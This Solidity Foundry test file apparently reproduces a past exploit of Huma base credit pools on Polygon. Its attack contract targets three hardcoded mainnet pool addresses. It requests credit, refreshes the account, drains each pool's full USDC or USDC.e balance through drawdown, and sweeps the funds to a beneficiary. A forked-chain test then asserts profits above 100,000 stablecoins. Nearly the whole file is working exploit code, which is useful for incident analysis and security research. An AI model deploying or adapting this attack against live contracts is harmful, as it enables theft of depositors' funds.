// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20Huma {
    function balanceOf(address account) external view returns (uint256);
}

interface IBaseCreditPoolHuma {
    function requestCredit(
        uint256 creditLimit,
        uint256 intervalInDays,
        uint256 numOfPayments
    ) external;

    function refreshAccount(address borrower) external;

    function drawdown(uint256 borrowAmount) external;
}

contract PolygonHumaBaseCreditPoolAttack {
    address internal constant POOL_USDC_1 = 0x3EBc1f0644A69c565957EF7cEb5AEafE94Eb6FcE;
    address internal constant POOL_USDCE_1 = 0x95533e56f397152B0013A39586bC97309e9A00a7;
    address internal constant POOL_USDCE_2 = 0xe8926aDbFADb5DA91CD56A7d5aCC31AA3FDF47E5;

    address internal constant USDC = 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359;
    address internal constant USDCE = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;

    uint256 internal constant INTERVAL_IN_DAYS = 1;
    uint256 internal constant NUM_PAYMENTS = 10;

    address public immutable beneficiary;

    constructor(address beneficiary_) {
        require(beneficiary_ != address(0), "beneficiary is zero");
        beneficiary = beneficiary_;
    }

    function executeAttack() external {
        _requestAndRefresh(POOL_USDC_1, 10_000_000e6);
        _requestAndRefresh(POOL_USDCE_1, 60_000e6);
        _requestAndRefresh(POOL_USDCE_2, 31_500e6);

        _drawdownFullPoolBalance(POOL_USDC_1, USDC);
        _drawdownFullPoolBalance(POOL_USDCE_1, USDCE);
        _drawdownFullPoolBalance(POOL_USDCE_2, USDCE);

        _sweep(USDC);
        _sweep(USDCE);
    }

    function _requestAndRefresh(address pool, uint256 creditLimit) internal {
        IBaseCreditPoolHuma(pool).requestCredit(creditLimit, INTERVAL_IN_DAYS, NUM_PAYMENTS);
        IBaseCreditPoolHuma(pool).refreshAccount(address(this));
    }

    function _drawdownFullPoolBalance(address pool, address token) internal {
        uint256 amount = IERC20Huma(token).balanceOf(pool);
        if (amount > 0) {
            IBaseCreditPoolHuma(pool).drawdown(amount);
        }
    }

    function _sweep(address token) internal {
        uint256 amount = IERC20Huma(token).balanceOf(address(this));
        if (amount == 0) return;

        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(0xa9059cbb, beneficiary, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

interface IERC20HumaTest {
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit7b8dHumaBaseCreditPoolTest is Test {
    address internal constant USDC = 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359;
    address internal constant USDCE = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;

    uint256 internal constant FORK_BLOCK_BEFORE_EXPLOIT_SETUP = 86_725_276;
    uint256 internal constant MIN_EXPECTED_TOTAL_PROFIT = 100_000e6;

    address internal attacker = makeAddr("ordinary-eoa-attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("POLYGON_RPC_URL"), FORK_BLOCK_BEFORE_EXPLOIT_SETUP);
        vm.deal(attacker, 10 ether);
    }

    function test_selfImplementedRequestRefreshDrawdownDrain() external {
        IERC20HumaTest usdc = IERC20HumaTest(USDC);
        IERC20HumaTest usdce = IERC20HumaTest(USDCE);

        uint256 attackerUsdcBefore = usdc.balanceOf(attacker);
        uint256 attackerUsdceBefore = usdce.balanceOf(attacker);

        vm.startPrank(attacker, attacker);
        PolygonHumaBaseCreditPoolAttack attack = new PolygonHumaBaseCreditPoolAttack(attacker);
        attack.executeAttack();
        vm.stopPrank();

        uint256 usdcProfit = usdc.balanceOf(attacker) - attackerUsdcBefore;
        uint256 usdceProfit = usdce.balanceOf(attacker) - attackerUsdceBefore;
        uint256 totalStableProfit = usdcProfit + usdceProfit;

        emit log_named_decimal_uint("attacker_usdc_profit", usdcProfit, 6);
        emit log_named_decimal_uint("attacker_usdce_profit", usdceProfit, 6);
        emit log_named_decimal_uint("attacker_total_stable_profit", totalStableProfit, 6);

        assertGt(usdcProfit, 80_000e6, "USDC pool was not drained");
        assertGt(usdceProfit, 18_000e6, "USDC.e pools were not drained");
        assertGt(totalStableProfit, MIN_EXPECTED_TOTAL_PROFIT, "profit below incident size");
    }
}
